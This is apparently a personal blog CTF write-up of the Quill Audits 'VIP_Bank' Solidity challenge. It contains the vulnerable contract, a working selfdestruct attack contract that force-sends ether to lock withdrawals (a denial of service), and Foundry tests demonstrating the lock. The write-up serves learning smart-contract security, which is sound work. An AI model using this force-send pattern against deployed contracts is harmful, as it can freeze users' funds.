---
date: 2023-04-13T12:09:20-04:00
draft: false
tags: [CTF, key 💡]
title: "Day06 - VIP_Bank"
---

Recently I discovered on Twitter [this](https://academy.quillaudits.com/challenges) challenges page from Quill Audits, and I decided to give it a try.

I started with the VIPBank challenge, which is a smart contract that allows you to deposit and withdraw funds from it. The challenge consists on locking the contract, aka DoS attack.

# The contract

```javascript
pragma solidity 0.8.7;

contract VIP_Bank{

    address public manager;
    mapping(address => uint) public balances;
    mapping(address => bool) public VIP;
    uint public maxETH = 0.5 ether;

    constructor() {
        manager = msg.sender;
    }

    modifier onlyManager() {
        require(msg.sender == manager , "you are not manager");
        _;
    }

    modifier onlyVIP() {
        require(VIP[msg.sender] == true, "you are not our VIP customer");
        _;
    }

    function addVIP(address addr) public onlyManager {
        VIP[addr] = true;
    }

    function deposit() public payable onlyVIP {
        require(msg.value <= 0.05 ether, "Cannot deposit more than 0.05 ETH per transaction");
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) public onlyVIP {
        require(address(this).balance <= maxETH, "Cannot withdraw more than 0.5 ETH per transaction");
        require(balances[msg.sender] >= _amount, "Not enough ether");
        balances[msg.sender] -= _amount;
        (bool success,) = payable(msg.sender).call{value: _amount}("");
        require(success, "Withdraw Failed!");
    }

    function contractBalance() public view returns (uint){
        return address(this).balance;
    }

}
```

# The attack

DoS attacks *(at least the ones I've seen for now)* are always based in the same principle, which is using the `selfdestruct()` method on an attack contract, which will force send all the funds to the victim contract even though this one won't accept incoming funds.

In this case, just by sending more than `maxETH` to the `VIP_Bank` contract, we will be able to lock it.

```javascript
pragma solidity 0.8.7;

contract Hack {
    constructor() {}

    receive() external payable {}

    function hack(address _Bank) public {
        selfdestruct(payable(_Bank));
    }
}
```

# POC

This is really the meat of this challenge for me, as I want to practice using the `foundry` framework.

We will write some tests that will prove that the `VIP_Bank` contract is in fact working properly and also show that once we use our `Hack` contract to perform the DoS attack, the contract will be locked.

### Tests initial setup

Pretty standard stuff when using `foundry`, we create a new instance of the `VIP_Bank` contract and the `Hack` contract and use the `setUp()` function which is called before each test.

```javascript
pragma solidity 0.8.7;

import "../src/VIPBank.sol";
import "../src/Hack.sol";

import "forge-std/Test.sol";

contract TestVIPBank is Test {
    VIP_Bank public vipBank;
    Hack public hack;

    function setUp() public {
        vipBank = new VIP_Bank();
        hack = new Hack();
    }
```

### Test correct functionality

This is the test that will ensure that the contract is functional and does what it is suposed to do.

```javascript
function test_canWithdraw() public {
    vipBank.addVIP(address(1));
    vm.deal(address(1), 0.1 ether);

    vm.startPrank(address(1));
    vipBank.deposit{value: 0.05 ether}();
    vipBank.withdraw(0.05 ether);
    vm.stopPrank();
}
```

### Test DoS attack

And this one will show that the contract is locked after we call our `Hack` contract.

```javascript
function testFail_cannnotWithdraw() public {
    vipBank.addVIP(address(1));
    vm.deal(address(hack), 0.1 ether);
    vm.deal(address(1), 0.6 ether);

    vm.startPrank(address(1));
    for (uint256 i = 0; i < 10; i++) {
        vipBank.deposit{value: 0.05 ether}();
    }
    hack.hack(address(vipBank));
    vipBank.withdraw(0.05 ether);
    vm.stopPrank();
}
```
Ideally we should simulate this test without giving `address(1)` VIP status, but it doesn't really matter, anyone could run the `hack()` function on the `Attack` contract.

## Wrapping up

As I'm still learning `foundry` this is the way I found to do it, but I'm sure there is a better way, if you know it, please let me know by hitting a DM [@mariodev__](https://twitter.com/mariodev__) on Twitter.